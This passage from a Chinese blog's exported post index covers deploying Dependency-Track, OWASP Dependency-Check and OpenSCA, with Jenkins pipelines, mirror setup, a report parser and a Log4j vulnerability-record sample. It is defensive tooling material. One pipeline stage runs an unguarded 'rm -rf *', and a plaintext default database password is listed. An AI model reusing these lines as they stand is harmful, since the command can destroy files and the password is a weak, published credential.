version，在“Artifact”处输入$&#123;WORKSPACE&#125;/target/bom.json\n\n\n测试结果测试过程先在DT中创建的项目，不知道能不能自动创建\n测试pipeline项目-创建API1.首先在Dependency-Track中点击【Administration】-&gt; 【Access Management】-&gt;【Teams】,创建一个Team并记录其API Key。\n2.API Key 添加PROJECT_CREATION_UPLOAD权限\npipeline scriptpipeline &#123;\n    agent any\n    stages &#123;\n        stage(&#39;Start&#39;) &#123;\n           steps &#123;\n               echo &#39;Hello World&#39;\n           &#125;\n       &#125;\n       stage(&#39;Build&#39;) &#123;\n           steps &#123;\n                git &#39;https:&#x2F;&#x2F;github.com&#x2F;sohutv&#x2F;cachecloud.git&#39;\n                sh &quot;mvn -DskipTests&#x3D;true clean package&quot;\n            &#125;\n       &#125;\n        stage(&#39;Generating SBOM with Cyclonedx&#39;) &#123;\n            steps &#123;\n                sh &#39;mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom&#39;\n            &#125;\n        &#125;\n        stage(&#39;dependencyTrackPublisher&#39;) &#123;\n            steps &#123;\n                withCredentials([string(credentialsId: &#39;dt&#39;, variable: &#39;API_KEY&#39;)]) &#123;\n                    dependencyTrackPublisher artifact: &#39;target&#x2F;bom.xml&#39;, projectId: &#39;534a7d70-c510-4770-8796-2abdac6f55d7&#39;,  autoCreateProjects: true, dependencyTrackApiKey:API_KEY, synchronous: false\n                &#125;\n            &#125;\n        &#125;\n    &#125;\n&#125;\n参考 OWASP Dependency-Track Plugin\n问题 使用projectName和projectVersion创建流水线失败ERROR: Either the projectId or the projectName and projectVersion have to be specifiedissue\n\n\nDependency-Track Jenkins Plugin Handling of Project Deletion in DT Server\nAuto-Create Projects doesn’t work - 3.6.1 VersionprojectName and projectVersion are already properties that get saved. For freestyle builds, it forces the use of projectId and will only record that, but for pipeline jobs you get the option to specify either the projectId or the projectName + projectVersion.\n\nHowever, projectName + projectVersion currently doesn&#39;t support synchronous publishing mode due to API limitations in DT.\n\n\n解决问题10\n\n\n增加API token 权限：创建项目需要PROJECT_CREATION_UPLOAD权限，查看result结果需要VULNERABILITY_ANALYSIS和VIEW_VULNERABILITY等，建议可添加全部权限。\n\n\n进阶用法\n\n\n使用质量门阈值控制，同DC\nEnable synchronous publishing mode同步发布模式将BOM发布到DT并返回依赖跟踪处理的结果\nPublish Dependency-Check results公开依赖处理的结果\n使用pipeline处理：import hudson.model.*;\nimport hudson.*\nimport groovy.json.JsonSlurper;\n\npipeline &#123;\n    agent any\n\n    tools &#123;\n        &#x2F;&#x2F; maven &#39;maven&#39;\n        &#x2F;&#x2F;maven &#39;maven-apollo&#39;\n        maven maven\n        git &#39;Default&#39;\n        jdk &#39;jdk&#39;\n        &#x2F;&#x2F; nodejs &#39;node&#39;\n\n    &#125;\n         \n    stages &#123;\n        stage(&#39;删除上次构建&#39; )&#123;\n            steps &#123;\n               \n                sh &#39;rm -rf *&#39;\n                \n                wrap([$class: &#39;BuildUser&#39;]) &#123;\n                  \n                   script&#123;\n                       buildName &quot;#$&#123;projectName&#125;-$&#123;BRANCH&#125;-$&#123;env.BUILD_USER&#125;&quot;   \n\n                   &#125;\n                &#125;\n                \n            &#125;\n        &#125;\n        \n        stage(&#39;拉取代码&#39;)&#123;\n            steps &#123;\n                echo &#39;代码分支:&#39;+BRANCH\n                echo &#39;代码地址:&#39; +GIT_URL\n                git branch: BRANCH, credentialsId: &#39;0eeb53a0-0390-41a4-9ac2-8d4c4c5c884f&#39;, url: GIT_URL\n                \n            &#125;\n        &#125;\n\n       \n        stage(&#39;build&#39;) &#123;\n         steps &#123;\n                sh &#39;&#39;&#39;\n                    mvn clean install -e -U -DskipDockerPush -DdockerImageTags&#x3D;latest -Dmaven.test.skip&#x3D;true $mvn_params -f pom.xml\n                    \n                &#39;&#39;&#39;\n             &#125;\n         &#125;\n         \n        stage(&#39;Generating SBOM with Cyclonedx&#39;) &#123;\n            steps &#123;\n                sh &#39;mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom&#39;\n            &#125;\n        &#125;\n        \n        stage(&#39;安全合规检查&#39;)&#123;\n            steps &#123;\n                script &#123;\n                    def jsonPayload &#x3D; new File(&quot;$WORKSPACE&#x2F;target&#x2F;bom.json&quot;).text\n                    def slurper &#x3D; new JsonSlurper()\n                    def states &#x3D; slurper.parseText(jsonPayload)\n                    def components &#x3D; states.components\n                    def checks &#x3D; [&#39;org.apache.shiro:shiro-spring&#39;:&#39;1.9.1&#39;]\n                    def fail_components &#x3D; &quot;&quot;\n                    for (component in components)&#123;\n                        def dep_name &#x3D; component.group + &quot;:&quot; + component.name\n                        \n                        if (dep_name in checks)&#123;\n                            current_version &#x3D; component.version\n                            \n                            check_version &#x3D; checks.get(dep_name)\n                            String[] current_version_chars &#x3D; current_version.split(&#39;\\\\.&#39;)\n                            String[] check_version_chars &#x3D; check_version.split(&#39;\\\\.&#39;)\n                            \n                            \n                            for(int i&#x3D;0; i&lt;current_version_chars.size(); i++)&#123;\n                                curr &#x3D; Integer.parseInt(current_version_chars[i])\n                                check &#x3D; Integer.parseInt(check_version_chars[i])\n                                if (curr &lt; check)&#123;\n                                    fail_components +&#x3D; component.group + &quot;:&quot; + component.name + &quot;版本过低，当前版本为：&quot; + component.version + &quot;，应不低于&quot; + check_version + &quot;\\n&quot;\n                                    break\n                                &#125;\n                            &#125;\n                        &#125;\n                        \n                    &#125;\n                    if(fail_components !&#x3D; &quot;&quot;)&#123;\n                        println(fail_components)\n                        error &quot;安全合规检查失败，请升级版本！！！&quot;\n                    &#125;\n                &#125;\n            &#125;\n        &#125;\n        \n        \n        stage(&#39;dependencyTrackPublisher&#39;) &#123;\n            steps &#123;\n                withCredentials([string(credentialsId: &#39;dt&#39;, variable: &#39;API_KEY&#39;)]) &#123;\n                    dependencyTrackPublisher artifact: &#39;target&#x2F;bom.xml&#39;, projectName: projectName, projectVersion: branch, \\\n                                            autoCreateProjects: true, dependencyTrackApiKey:API_KEY, synchronous: true, \\\n                                            failedNewCritical : 10000, failedNewHigh : 10000, failedNewLow: 10000, failedNewMedium: 10000, \\\n                                            failedTotalCritical : 10000, failedTotalHigh : 10000, failedTotalLow : 10000, failedTotalMedium : 10000,\n                                            unstableNewCritical : 10000, unstableNewHigh : 10000, unstableNewLow : 10000, unstableNewMedium : 10000,\\\n                                            unstableTotalCritical : 10000, unstableTotalHigh : 10000,unstableTotalLow : 10000, unstableTotalMedium : 10000\n                &#125;\n            &#125;\n        &#125;\n        \n    &#125;\n\n&#125;\n\n\n\n\nusageAnalyzers分析功能支持四种分析方式：\n\ninternal:默认开启，用于NVD和VulnDB的在线分析\nNPM Audit：默认开启，node.js的在线云服务\nSonatype OSS Index：默认关闭，需要配置：\nVulnDB：默认关闭，需要配置\n\nSonatype OSS Indexsonatype免费注册,注册后将注册邮箱和APItoken集成到deployment-track。sonatype支持上百万中组件的搜索，可以通过 REST API进行依赖扫描，同时sonatype还提供一款GitHub APP，Sonatype Lift · GitHub Marketplace · GitHub在每次来取请求时标记漏洞、在代码review时报告找的高风险issue。\nVulnDBVulnDB配置文档支持两种方式：\n\n通过VulnDB REST API进行分析API文档中未找到Consumer key 和Consumer secret，使用api key和用户名进行配置，可能存在问题。\n使用VULnDB 镜像数据库分析下载并安装VulnDB镜像GitHub - stevespringett&#x2F;vulndb-data-mirror: A simple Java command-line utility to mirror the entire contents of VulnDB.vulndb-data-mirror.sh \\\n    --consumer-key mykey \\\n    --consumer-secret mysecret \\\n    --dir &quot;~&#x2F;.dependency-track&#x2F;vulndb&quot;\n\n漏洞来源漏洞来源主要是：\n\nNVD：默认开启，在线feeds地址\nGithub Advisories:默认关闭，需要配置。GitHubPAT配置文档Creating a personal access token - GitHub Docs。\n\nRepositories默认不需要配置，添加了内部私仓Nexus Repository Manager\n通知添加webhook-slack添加webhook，但是没有消息提醒。template中的JSON格式不满足slack的消息格式。Creating rich message layouts | Slack\n添加mailAPI\ntrouble-shoutingsmtp![[2022-08-08_周一#DT 通知功能配置问题]]\n请求实例太大报错信息：\n[DependencyTrack] Publishing artifact to Dependency-Track - [http:&#x2F;&#x2F;dt-api.kubegems.io:32126](http:&#x2F;&#x2F;dt-api.kubegems.io:32126&#x2F;)\n[DependencyTrack] An error occurred connecting to Dependency-Track - HTTP response code: 413 Request Entity Too Large\n[DependencyTrack] &lt;html&gt;&lt;head&gt;&lt;title&gt;413 Request Entity Too Large&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;center&gt;&lt;h1&gt;413 Request Entity Too Large&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;&lt;hr&gt;&lt;center&gt;nginx&#x2F;1.19.9&lt;&#x2F;center&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;\n修改路由配置，添加annotationAdvanced Configuration with Annotations | NGINX Ingress Controller\n# 默认1m 键值对\nnginx.org&#x2F;client-max-body-size 100m\n# anotations\n annotations:\n    nginx.org&#x2F;client-max-body-size: 100m\n\nIO阻塞\n\nQ:jenkins pipeline jobe push sbom.xml 2 dt timeout.\nA:分析日志apiserver-log。Jenkins job失败时间最早发生在17:18分钟，但是应用日志只有从17:36分开始记录的信息。初步分析可能是2022-09-06 17:53:58,790 ERROR [ServerRuntime$Responder] An I/O error has occurred while writing a response message entity to the container output stream.org.glassfish.jersey.server.internal.process.MappableException: org.eclipse.jetty.io.EofException既-短时间内大量的并发请求到APIserver的某些接口，接口处理超时导致资源耗尽引发阻塞。可能情况1：漏洞库更新任务占据了大量IO，通过日志分析：\n\nNistMirrorTask download 用时18710ms\nNistMirrorTask parse 用时5023970ms\nNistMirrorTask 总用时5062313ms（约1.4小时）\nGitHubAdvisoryMirrorTask总用时497066ms（约1.6分钟可忽略）可能情况2：push SBOM大量并发长请求，导致APIserver网络阻塞、I&#x2F;O过载\nJenkins 对接DT用到了put方法publishing SBOM，\njenkins使用Enable synchronous publishing mode同步发布模式将BOM发布到DT并返回依赖跟踪处理的结果，可能在NistMirrorTask GitHubAdvisoryMirrorTask  MetricsUpdateTask后同步更新信息A:解决思路\n 申请服务器部署war包的方式部署（以及集群部署？）\n 更换MySQL数据库\n 现有K8S容器环境中设置时区，设置漏洞库更新时间，扩容副本 ✅ 2022-09-07 添加key:TZ value:Asia&#x2F;Shanghai\n 提个issue ✅ 2022-09-07\n 修改Jenkinstimeout参数\n\nQ：otherERROR [LoggableUncaughtExceptionHandler] An unknown error occurred in an asynchronous event or notification thread · Issue #1059 · DependencyTrack&#x2F;dependency-track · GitHub近1周资源监控信息重启pod后的资源监控信息重启后的日志\nReferencesGitHub - AppThreat&#x2F;cdxgen: Creates CycloneDX Software Bill-of-Materials (SBOM) for your projects from source and container images. Supports many languages and package managers. Integrate in your CI&#x2F;&#x2F;CD pipeline with automatic submission to Dependency Track server.GitHub - CycloneDX&#x2F;cyclonedx-cli: CycloneDX CLI tool for SBOM analysis, merging, diffs and format conversions.Site Unreachable深度解读 |《构建软件组件透明度：建立通用的软件物料清单（SBOM）》（上）OWASP Dependency-Track | Jenkins plugin使用Jenkins新建并配置一个本地项目Jenkins持续集成demoGitHub | Jenkins pluginOWASP Dependency-Track Plugin基于开源工具实现软件成分分析SCA - 先知社区基于 Dependency-Track 构建免费的第三方组件安全管理平台 - 安全客，安全资讯平台\n","slug":"dependency-track","date":"2022-06-23T09:38:36.281Z","categories_index":"软件供应链安全","tags_index":"SCA,SBOM,OWASP,部署手册,dependency-track,软件供应链","author_index":"Moses"},{"id":"520e1d6d52856a91475d0b89567aa470","title":"软件供应链安全分析工具-Dependency-Check","content":"dependency-check0x01简介Dependency-Check是OWASP（Open Web Application Security Project）的一个实用开源程序，用于识别项目依赖项并检查是否存在任何已知的，公开披露的漏洞。目前，已支持Java、.NET、Ruby、PHP、Node.js、Python等语言编写的程序，并为C&#x2F;C++构建系统（autoconf和cmake）提供了有限的支持。而且该工具还是OWASP Top 10的解决方案的一部分。\nDependency-Check支持面广（支持多种语言）、可集成性强，作为一款开源工具，在多年来的发展中已经支持和许多主流的软件进行集成，比如：命令行、Ant、Maven、Gradle、Jenkins、Sonar等；具备使用方便，落地简单等优势。\n\n项目地址\n官网\nDocs\n\nDependency Check有三种使用方式：\n从命令行使用：此时Dependency Check作为一个单独的软件，与项目无关，使用时只需指定需要扫描的项目位置即可。在业务上线流程中推荐使用此方式  \n作为插件在项目中使用：此时需要在项目的配置文件中做相关内容添加，只对当前项目有效。别的项目需要使用时，需要重新修改配置文件  \n作为Ant Task使用：这种方式的使用介于以上两者之间，可以在多个项目中使用，但是需要安装，并且需要在项目的build.xml中添加相关配置。\n\n0x02实现原理依赖性检查可用于扫描应用程序（及其依赖库），执行检查时会将 Common Platform Enumeration (CPE)美帝国家漏洞数据库及NPM Public Advisories库下载到本地，再通过核心引擎中的一系列分析器检查项目依赖性，收集有关依赖项的信息，然后根据收集的依赖项信息与本地的CPE&amp;NPM库数据进行对比，如果检查发现扫描的组件存在已知的易受攻击的漏洞则标识，最后生成报告进行展示。\n依赖项检查的工作原理是收集有关其扫描的文件的信息（使用分析器）。收集的信息称为证据；收集的证据有三种类型：供应商、产品和版本。例如，JarAnalyzer将从清单、pom.xml和扫描的JAR文件中的软件包名称中收集信息，并具有启发式方法将来自各种来源的信息放入一个或多个证据桶中。在NVD CVE数据（模式可以在这里找到）中，每个CVE条目都有一个易受攻击的软件列表：\n&lt;entry id&#x3D;&quot;CVE-2012-5055&quot;&gt;\n  ...\n    &lt;vuln:vulnerable-software-list&gt;\n      &lt;vuln:product&gt;cpe:&#x2F;a:vmware:springsource_spring_security:3.1.2&lt;&#x2F;vuln:product&gt;\n      &lt;vuln:product&gt;cpe:&#x2F;a:vmware:springsource_spring_security:2.0.4&lt;&#x2F;vuln:product&gt;\n      &lt;vuln:product&gt;cpe:&#x2F;a:vmware:springsource_spring_security:3.0.1&lt;&#x2F;vuln:product&gt;\n    &lt;&#x2F;vuln:vulnerable-software-list&gt;\n  ...\n  &lt;&#x2F;entry&gt;\n在NVD CVE数据库中，每个CVE条目都有一个易受攻击的软件列表。这些CPE条目记录了“CPE:&#x2F;入口类型:供应商:产品:版本:修订:…”这些属性。这些数据被收集并存储在Lucene索引中。然后使用所收集的证据，并尝试匹配Lucene CPE索引中的条目。如果找到，CPEAnalyzer分析器将向依赖项添加标识符，并随后添加到报告中。一旦确定了CPE，就将关联的CVE条目添加到报告中。这些证据在写入报告的时候会被分级使用不同的信心级别——低、中、高和最高。它等于在识别过程中使用的证据的最低水平的信心水平。如果用于识别某个CPE的一系列证据中信心等级最低的证据是高级，那么，那么CPE将拥有高级的信心水平。\n0x03Quickstartmacbrew update &amp;&amp; brew install dependency-check\n下载安装 GitHub Release\n编译安装-略usage命令行使用Command Line Argumentsdependency-check –advancedHelp包括使用本地数据库、制成品库扫描等\n支持的文件dependency-check – File Type Analyzersdependency-check支持多种格式的文件：Zip archive format (*.zip, *.ear, *.war, *.jar, *.sar, .apk, .nupkg); Tape Archive Format (.tar); Gzip format (.gz, .tgz); Bzip2 format (.bz2, *.tbz2)。\n示例第一次使用,需要下载漏洞库\n 生成扫描报告: Dependency-check支持多种输出格式，默认是HTML格式。在命令式方式使用时，指定参数–format来选定格式，可以有XML, HTML, CSV, JSON, VULN, ALL这些选项（必须是大写）。                                                               \n扫描结果对比 [[OpenSCA#测试对比]]\n插件使用\nMaven: mvn -version 3.5.0 and higher\nMaven命令方式:\nmvn org.owasp:dependency-check-maven:check\n查询某一个依赖 mvn dependency:list|grep -i &quot;log4j*&quot;\nmvn dependency:tree\n聚合查询 mvn clean org.owasp:dependency-check-maven:aggregate -Dformat=HTML\n需要在maven的项目依赖你添加dependency-check的依赖如下： &lt;project&gt;\n    &lt;build&gt;\n        &lt;plugins&gt;\n            ...\n            &lt;plugin&gt;\n              &lt;groupId&gt;org.owasp&lt;&#x2F;groupId&gt;\n              &lt;artifactId&gt;dependency-check-maven&lt;&#x2F;artifactId&gt;\n              &lt;executions&gt;\n                  &lt;execution&gt;\n                      &lt;goals&gt;\n                          &lt;goal&gt;check&lt;&#x2F;goal&gt;\n                      &lt;&#x2F;goals&gt;\n                  &lt;&#x2F;execution&gt;\n              &lt;&#x2F;executions&gt;\n            &lt;&#x2F;plugin&gt;\n            ...\n        &lt;&#x2F;plugins&gt;\n        ...\n    &lt;&#x2F;build&gt;\n    ...\n&lt;&#x2F;project&gt;\n\nant使用 略 dependency-check-ant – Configuration\n0x04 漏洞库本地安装后，会缓存NVD数据库，主要是两个文件jsrepository.json和odc.mv.db\n搭建本地NVD Mirror库需求\n企业中内网环境可能CI服务器不会开放对外网的访问权限，需要搭建一个本地的NVDMirror\n需要二次开发\n\n手动搭建nvd官方提供了对应jar包来作为mirror的服务GitHub - stevespringett&#x2F;nist-data-mirror: A simple Java command-line utility to mirror the CVE JSON data from NIST.\n\n下载release jar包Site Unreachable\n执行java -jar nist-data-mirror.jar\n搭建Apache服务\n定时任务更新jsreponsitory.jsondependency-check – Snapshotting the NVD\n客户端使用设置参数如下--cveUrlModified http:&#x2F;&#x2F;你的本地服务器:30006&#x2F;nvdcve-1.1-modified.json.gz\n--cveUrlBase http:&#x2F;&#x2F;你的本地服务器:30006&#x2F;nvdcve-1.1-modified.json.gz\njenkins pipeline修复mirror地址dependencyCheck additionalArguments: &#39;--cveUrlModified http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;nvdcve-1.1-2019.json.gz --cveUrlBase http:&#x2F;&#x2F;x.x.x.x:8080&#x2F;nvdcve-1.1-2019.json.gz &#39;, odcInstallation: &#39;dependency-check&#39;\n\ndocker搭建$ mvn clean package\n$ docker build --rm -t sspringett&#x2F;nvdmirror .\n$ mkdir target&#x2F;docs\n$ docker run -dit \\\n  --name mirror \\\n  -p 80:80 \\\n  --mount type&#x3D;bind,source&#x3D;&quot;$(pwd)&quot;&#x2F;target&#x2F;docs&#x2F;,target&#x3D;&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;htdocs \\\n  sspringett&#x2F;nvdmirror\n\nk8s部署# 打包，**需要chartmusuem**\n# cd to charts directory\n$ cd nist-data-mirror\n\n# Create directory for package\n$ mkdir .&#x2F;target\n\n# Package helm chart\n$ helm package --app-version &lt;app_version&gt;  --version &lt;helm_chart_version&gt; -destination .&#x2F;target .\n\n# As a best practice, push your packaged chart to helm repo. e.g. push it to artifactory, chartmusuem etc.\n$ helm push target&#x2F;nist-data-mirror-&lt;helm_chart_version&gt;.tgz chartmuseum\n# 部署\n# helm install --name &lt;release_name&gt; &lt;helm_repo&gt;&#x2F;&lt;chart_name&gt;\n$ helm install --name nist-data-mirror chartmuseum&#x2F;nist-data-mirror\n\nMysql 存储nvd 数据目前支持的数据库包括：h2、mysql、oracle、sql server、postgresQL。以MySQL为例：1.创建MySQL数据库2.初始化数据库，脚本-&gt;DependencyCheck&#x2F;core&#x2F;src&#x2F;main&#x2F;resources&#x2F;data at main · jeremylong&#x2F;DependencyCheck · GitHub3.将对应的MySQL数据库驱动拷贝到dependency-check-7.1.0-release\\dependency-check\\lib的目录中4.执行命令dependency-check -s biz-service-0-1.0.0.jar --dbDriverName r --connectionString jdbc:mysql://127.0.0.1:3306/dependencycheck --dbUser dcuser --propertyfile dependencycheck.properties暂时没有需要未实际搭建\n# 初始账号密码\ndata.user&#x3D;dcuser\ndata.password&#x3D;DC-Pass1337!\nCI&#x2F;CD集成Jenkins-未测试Jenkins没有权限\n安装OWASP Dependency-Check插件\n\n全局工具配置下配置dependency插件路径及版本（可单独下载）自动安装未成功，可以手动下载\nwget https:&#x2F;&#x2F;github.com&#x2F;jeremylong&#x2F;DependencyCheck&#x2F;releases&#x2F;download&#x2F;v7.1.1&#x2F;dependency-check-7.1.1-release.zip\n全局工具配置，设置Dendency-Check 别名 安装路径\n\nfreestyle项目在构建步骤选择‘增加构建步骤’，选择‘Dependency_check’或者使用**###  execute shell**\nsh &#x2F;home&#x2F;dc&#x2F;dependency-check&#x2F;bin&#x2F;dependency-check.sh -s $&#123;WORKSPACE&#125;&#x2F; --format HTML --format XML  -o .&#x2F;\npipeline流水线中执行dependency-check安全扫描\nsh &#39;&#x2F;data&#x2F;jenkins&#x2F;tools&#x2F;org.jenkinsci.plugins.DependencyCheck.tools.DependencyCheckInstallation&#x2F;dependency-check&#x2F;bin&#x2F;dependency-check.sh -s PWD&#x2F;dependency-check-report.xml’\nsh &#39;&#x2F;data&#x2F;jenkins&#x2F;tools&#x2F;org.jenkinsci.plugins.DependencyCheck.tools.DependencyCheckInstallation&#x2F;dependency-check&#x2F;bin&#x2F;dependency-check.sh -s PWD&#x2F;dependency-check-report.html\n使用Jenkins发布XML和HTML报告\n\n设置风险门禁，设置允许的严重、高、中或低严重性发现总数的阈值。如果发现的数量等于或大于任何一个严重性的阈值，则作业状态将更改为不稳定或失败。也可以设置对新发现的检测结果设置阈值。\n\n最终效果\n\n查看结果汇总\n\nhtml报告解析\nfrom bs4 import BeautifulSoup\nfrom lxml import etree\n\nclass GetSecRes:\n    \n    def get_dependency_critical_num_with_lxml(self, filename):\n        &#39;&#39;&#39;\n        用lxml库解析安全扫描的html报告，并统计出其中的critical的漏洞数量\n        :param filename: dependency-check扫描完成后生产的html文件，文件名全路径\n        :return:critical数量\n        &#39;&#39;&#39;\n        # 读取html文件\n        with open(filename, encoding&#x3D;&#39;utf-8&#39;) as f:\n            data &#x3D; f.read()\n        doc &#x3D; etree.HTML(data)\n        # 获取漏洞汇总表中的漏洞行信息\n        trs &#x3D; doc.xpath(&#39;&#x2F;&#x2F;*[@id&#x3D;&quot;summaryTable&quot;]&#x2F;&#x2F;tr[@class&#x3D;&quot; vulnerable&quot;]&#39;)\n        criticalres &#x3D; []\n        # 统计出每行的critical数量\n        for tr in trs:\n            tr_list &#x3D; tr.xpath(&#39;.&#x2F;td&#x2F;@data-sort-value&#39;)\n            td_text &#x3D; tr.xpath(&#39;.&#x2F;td&#x2F;text()&#39;)\n            tr_list.extend(td_text)\n            [criticalres.append(td) for td in tr_list if &quot;CRITICAL&quot; &#x3D;&#x3D; td]\n        return (len(criticalres))\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    import sys\n    filename &#x3D; sys.argv[1]\n    criticalres &#x3D; GetSecRes().get_dependency_critical_num_with_lxml(filename)\n    print(”严重组件数量“,criticalres)\n\n\n集成脚本到jenkins的execute shell中\ncritical&#x3D;$(python3 &#x2F;home&#x2F;get-security-result.py $&#123;DIR&#125;&#x2F;dependency-check-report.html)  \necho $critical\n\nSonarqube-未测试没有权限1.下载对应sonarqube版本的jar包插件GitHub - dependency-check&#x2F;dependency-check-sonar-plugin: Integrates Dependency-Check reports into SonarQube2.上传到%SONAR_HOME%&#x2F;extensions&#x2F;plugins目录下3.重启sonarqube4.jenkins流水线中执行sonar扫描\nReferences\njar第三方组件Dependency-check依赖检查工具|棉花哥的博客|Cotton’s Blog\n使用OWASP Dependency-Check进行第三方依赖包安全扫描实践 | 码农家园\n「干货」Dependency check配置Mysql数据库存储nvd数据_科技通讯_闲暇巴\nSonarQube集成DependencyCheck - Open-Source Security Architecture\nOWASP Dependency-Check | Jenkins plugin\n【安全测试】Owasp Dependency-check 集成jenkins - 码上起舞 - 博客园\nDependency-Check部署及Jenkins集成OWASP Dependency-Check Plugin_我在北国不背锅的博客-CSDN博客_jenkins owasp\n\n","slug":"dependency-check","date":"2022-06-22T05:45:00.000Z","categories_index":"软件供应链安全","tags_index":"SCA,软件供应链安全,OWASP,dependency-check,部署手册","author_index":"Moses"},{"id":"6da9a10f7f69267b09cc355dd9f52db7","title":"软件成分分析-OpenSCA","content":"OpenSCA0x01简介OpenSCA是SCA技术原理的实现。作为悬镜安全 (opens new window)旗下源鉴OSS开源威胁管控产品 (opens new window)的开源版本，OpenSCA继承了源鉴OSS的多源SCA开源应用安全缺陷检测等核心能力，通过软件成分分析、依赖分析、特征分析、引用识别、合规分析等方法，深度挖掘组件中潜藏的各类安全漏洞及开源协议风险，保障应用开源组件引入的安全。\n\n官网OpenSCA-用开源的方式做开源风险治理\n文档简介 | OpenSCA-用开源的方式做开源风险治理\n项目GitHub - XmirrorSecurity&#x2F;OpenSCA-cli: OpenSCA is a Software Composition Analysis (SCA) solution that supports detection of open source component dependencies and vulnerabilities.\n\n0x02应用场景安全开发\nOpenSCA开源的IDE开源风险检测插件，帮助个人&#x2F;企业开发者快速定位并修复漏洞\n开发人员友好，轻量级低成本零门槛安装\n企业级SCA核心引擎，支持二次开发\n\n安全测试\n产品第三方开源组件的安全测试\n提高软件产品安全性，防止应用带病上线\n\n安全管理\n第三方组件及供应商软件的安全准入\n企业内部安全组件库的建立\n软件或组件资产可视化清单梳理\n安全部门合规审查及相关开源治理工作\n\n0x03Quickstartrequire第一步：下载最新版本的本地检测工具从 GitHub (opens new window)或 Gitee (opens new window)下载对应系统架构的可执行程序压缩包，并解压到本地任意目录下。\n第二部：注册获取token\n登录 (opens new window)或注册 (opens new window)进入OpenSCA (opens new window)云平台；\n进入【认证令牌】菜单内，选择令牌到期时间，点击生成令牌，生成您的认证令牌。每个账号的令牌是唯一的，且有失效时间；\ntoken 用于本地检测应用包或项目时访问云端知识库的认证。\n\ninstall-编译检测工具git clone https:&#x2F;&#x2F;github.com&#x2F;XmirrorSecurity&#x2F;OpenSCA-cli.git opensca\ncd opensca\ngo work init cli analyzer util\ngo build -o opensca-cli cli\n\nUsage\n本地离线检测仅用于检测组件信息：\n\nopensca-cli -path $&#123;project_path&#125;\n\n\n在线检测要连接到云平台：\n\nopensca-cli -url $&#123;url&#125; -token $&#123;token&#125; -path $&#123;project_path&#125;\n\n\n或者用于使用本地漏洞数据库：\n\nopensca-cli -db db.json -path $&#123;project_path&#125;\n\n漏洞数据库数据库文件格式[\n  &#123;\n    &quot;vendor&quot;: &quot;org.apache.logging.log4j&quot;,\n    &quot;product&quot;: &quot;log4j-core&quot;,\n    &quot;version&quot;: &quot;[2.0-beta9,2.12.2)||[2.13.0,2.15.0)&quot;,\n    &quot;language&quot;: &quot;java&quot;,\n    &quot;name&quot;: &quot;Apache Log4j2 远程代码执行漏洞&quot;,\n    &quot;id&quot;: &quot;XMIRROR-2021-44228&quot;,\n    &quot;cve_id&quot;: &quot;CVE-2021-44228&quot;,\n    &quot;cnnvd_id&quot;: &quot;CNNVD-202112-799&quot;,\n    &quot;cnvd_id&quot;: &quot;CNVD-2021-95914&quot;,\n    &quot;cwe_id&quot;: &quot;CWE-502,CWE-400,CWE-20&quot;,\n    &quot;description&quot;: &quot;Apache Log4j是美国阿帕奇（Apache）基金会的一款基于Java的开源日志记录工具。\\r\\nApache Log4J 存在代码问题漏洞，攻击者可设计一个数据请求发送给使用 Apache Log4j工具的服务器，当该请求被打印成日志时就会触发远程代码执行。&quot;,\n    &quot;description_en&quot;: &quot;Apache Log4j2 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0, this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.&quot;,\n    &quot;suggestion&quot;: &quot;2.12.1及以下版本可以更新到2.12.2，其他建议更新至2.15.0或更高版本，漏洞详情可参考：https:&#x2F;&#x2F;github.com&#x2F;apache&#x2F;logging-log4j2&#x2F;pull&#x2F;608 \\r\\n1、临时解决方案，适用于2.10及以上版本：\\r\\n\\t（1）设置jvm参数：“-Dlog4j2.formatMsgNoLookups&#x3D;true”；\\r\\n\\t（2）设置参数：“log4j2.formatMsgNoLookups&#x3D;True”；&quot;,\n    &quot;attack_type&quot;: &quot;远程&quot;,\n    &quot;release_date&quot;: &quot;2021-12-10&quot;,\n    &quot;security_level_id&quot;: 1,\n    &quot;exploit_level_id&quot;: 1\n  &#125;,\n  &#123;&#125;\n]\n数据库字段解释\n\n\n学科\n描述\n要求或不需要\n\n\n\nvendor\n组件的制造商\nN\n\n\nproduct\n组件的名称\nY\n\n\nversion\n受漏洞影响的组件版本\nY\n\n\nlanguage\n组件的编程语言\nY\n\n\nname\n漏洞的名称\nN\n\n\nid\n自定义标识符\nY\n\n\ncve_id\ncve标识符\nN\n\n\ncnnvd_id\ncnnvd标识符\nN\n\n\ncnvd_id\ncnvd标识符\nN\n\n\ncwe_id\ncwe标识符\nN\n\n\ndescription\n对漏洞的描述\nN\n\n\ndescription_en\n英语对漏洞的描述\nN\n\n\nsuggestion\n修复漏洞的建议\nN\n\n\nattack_type\n攻击类型\nN\n\n\nrelease_date\n漏洞的发布日期\nN\n\n\nsecurity_level_id\n漏洞的安全级别（从1减少到4）\nN\n\n\nexploit_level_id\n漏洞的利用级别（0-N&#x2F;A 1-可用）\nN\n\n\n自建数据库参考OpenCVE的数据格式\nIDEA插件\n插件市场下载（下载量300左右）\n源码编译安装-略\n在OpenSCA平台 (opens new window)下载插件安装\n\n插件执行流程\n0x04 测试\n测试项目：SpringCloudDemo\nIDE：Idea 2021.2.3IntelliJ IDEA 2021.2.3 (Ultimate Edition)\n运行时版本: 11.0.12+7-b1504.40 x86_64\nVM: OpenJDK 64-Bit Server VM，JetBrains s.r.o.\nmacOS 12.3.1\nGC: G1 Young Generation, G1 Old Generation\n\n\n插件版本：\ncn.xmirror.sca.xcheck (1.0.1)\nio.snyk.snyk-intellij-plugin (2.4.34)\n\n\n\n测试-检测结果OpenSCA-Check：198个漏洞：45个严重、103个高危、47个中危、3个低危📢cli扫描结果文件 